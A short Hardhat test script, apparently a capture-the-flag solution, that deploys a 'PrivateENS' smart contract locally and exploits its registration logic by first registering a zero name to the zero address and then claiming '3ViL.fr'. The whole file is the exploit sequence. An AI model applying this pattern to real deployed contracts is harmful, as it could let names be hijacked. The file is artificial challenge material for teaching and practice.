const { expect } = require("chai");
const { ethers, waffle } = require("hardhat");
                         


describe("Challenge 05", function () {
    it("Should deploy the contract, and exploit it", async function ()
    {
    
        const challenge01 = await ethers.getContractFactory("PrivateENS");
        const challenge01_contract = await challenge01.deploy();
        await challenge01_contract.deployed();

        console.log("Contract deployed to ", challenge01_contract.address);

       let hero_registrar = await challenge01_contract.get_registrar(ethers.utils.formatBytes32String("HeroCTF.fr"));

       console.log("Registrar ->", hero_registrar);
       
        let registrassion = await challenge01_contract.register(ethers.utils.formatBytes32String("0"), "0x0000000000000000000000000000000000000000");
        await registrassion.wait();

        let registrassion2 = await challenge01_contract.register(ethers.utils.formatBytes32String("3ViL.fr"), "0xffffffffffffffffffffffffffffffffffffffff");
        await registrassion2.wait();

        hero_registrar = await challenge01_contract.get_registrar(ethers.utils.formatBytes32String("3ViL.fr"));
        console.log("Registrar ->", hero_registrar);

    });
});